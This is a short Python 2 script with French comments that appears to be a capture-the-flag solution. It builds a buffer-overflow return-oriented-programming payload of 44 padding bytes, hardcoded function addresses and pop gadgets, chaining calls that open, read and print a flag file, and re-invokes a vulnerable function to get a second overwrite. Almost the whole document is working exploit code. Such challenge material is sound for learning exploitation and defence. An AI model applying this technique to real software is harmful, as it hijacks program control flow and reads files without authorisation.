#!/usr/bin/python
# encoding: utf-8
# Cette fonction transforme un entier en 4 caractères
def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret  = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret
# Le principe consiste à exécuter la fonction ret(AG1) qui ouvre flag, puis la
# fonction ori(AG2,AG3) qui lit le fichier et enfin pro() qui affiche le buffer
# On peut écraser la pile par 5 mots en envoyant 44 octets puis les 5 mots
# Un appel de fonction se fait de la façon suivante
# <fct><pop n><ag1>...<agn><suite>...
# où pop n est un gadget faisoant n pop de la suite.
# Lors du ret avec cette pile, on se retrouve au début de fct avec la pile
# <pop n><ag1>...<agn><suite>...
# fct(ag1,...,agn) s'effectue puis le retour se fait sur pop n avec comme pile
# <ag1>...<agn><suite>...
# Ce pop n «pope» les arguments et fait un return sur la pile <suite>...
# Il faudrait ici faire donc comme pile
# RET+PP1+AG1+ORI+PP2+AG2+AG3+PRO
# mais cela dépasse la taille de 5 mots possibles pour écraser la pile
# On utilise une astuce en réappelant la fonction ezy() pour refaire un
# nouvel écrasement de la pile

ORI=adr_to_str16(0x080485c4)
AG2=adr_to_str16(0xabcdefff)
AG3=adr_to_str16(0x78563412)
RET=adr_to_str16(0x08048569)
AG1=adr_to_str16(0xbadbeeef)
EZY=adr_to_str16(0x0804852d)
PP1=adr_to_str16(0x08048395)
PP2=adr_to_str16(0x080486ee)
PRO=adr_to_str16(0x0804862c)
pile=RET+PP1+AG1+EZY
pile=44*"A"+pile+"AAA"
# cette pile de longueur 0x40 = 64 va enchainer ret(AG1) puis ezy()
print pile
# cette pile va enchainer  ori(AG2,AG3) puis pro()
pile=ORI+PP2+AG2+AG3+PRO
pile=44*"A"+pile
print pile
